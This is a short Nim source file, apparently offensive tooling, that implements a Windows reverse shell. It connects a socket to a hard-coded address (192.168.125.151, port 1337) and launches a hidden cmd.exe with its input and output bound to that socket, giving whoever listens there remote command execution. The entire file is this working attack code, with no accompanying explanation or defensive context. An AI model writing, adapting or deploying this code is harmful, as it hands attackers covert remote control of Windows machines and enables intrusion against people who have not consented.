import winim

proc main() = 
  var 
    ip = "192.168.125.151".cstring
    port: uint16 = 1337
    wsaData: WSADATA

  # call WSAStartup
  var wsaStartupResult = WSAStartup(MAKEWORD(2,2), addr wsaData)
  if wsaStartupResult != 0:
    # echo "[-] WSAStartup failed"
    quit(1)

  # call WSASocket
  var soc = WSASocketA(2, 1, 6, NULL, cast[GROUP](0), cast[DWORD](NULL))

  # create sockaddr_in struct
  var sa: sockaddr_in
  sa.sin_family = AF_INET
  sa.sinaddr.S_addr = inet_addr(ip)
  sa.sin_port = htons(port)

  # call connect
  var connectResult = connect(soc, cast[ptr sockaddr](sa.addr), cast[int32](sizeof(sa)))
  if connectResult != 0:
    # echo "[-] Connection failed"
    quit(1)

  # call CreateProcessA
  var 
    si: STARTUPINFO
    pi: PROCESS_INFORMATION
  si.cb = cast[DWORD](sizeof(si))
  si.dwFlags = STARTF_USESTDHANDLES
  si.hStdInput = cast[HANDLE](soc)
  si.hStdOutput = cast[HANDLE](soc)
  si.hStdError = cast[HANDLE](soc)

  CreateProcessA(NULL, "cmd".cstring, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, cast[LPSTARTUPINFOA](si.addr), pi.addr)

when isMainModule:
  main()
